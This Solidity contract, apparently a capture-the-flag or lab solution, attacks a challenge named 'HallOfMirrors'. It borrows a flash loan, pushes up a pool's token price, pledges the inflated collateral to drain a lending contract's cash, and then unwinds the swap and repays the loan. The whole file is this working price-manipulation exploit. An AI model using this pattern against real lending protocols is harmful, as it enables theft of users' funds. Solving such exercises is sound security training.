import {Coin, MirrorPool, QuickLoan, PawnShop} from "@contracts/HallOfMirrors.sol";

contract Attacker {
    Coin stake;
    Coin cash;
    MirrorPool pool;
    QuickLoan loan;
    PawnShop shop;

    constructor(Coin _stake, Coin _cash, MirrorPool _pool, QuickLoan _loan, PawnShop _shop) {
        stake = _stake;
        cash = _cash;
        pool = _pool;
        loan = _loan;
        shop = _shop;
    }

    function attack(uint256 borrowAmount, uint256 stakeAmount) external {
        loan.borrow(borrowAmount, abi.encode(stakeAmount));
    }

    function onFlashLoan(uint256 amount, bytes calldata data) external {
        uint256 stakeAmount = abi.decode(data, (uint256));

        cash.approve(address(pool), amount);
        pool.swapCashForStake(amount);

        stake.approve(address(shop), stakeAmount);
        shop.pledge(stakeAmount);

        uint256 borrowable = cash.balanceOf(address(shop));
        shop.draw(borrowable);

        uint256 poolStake = stake.balanceOf(address(pool));
        pool.swapStakeForCash(poolStake);

        cash.transfer(address(loan), amount);
    }
}

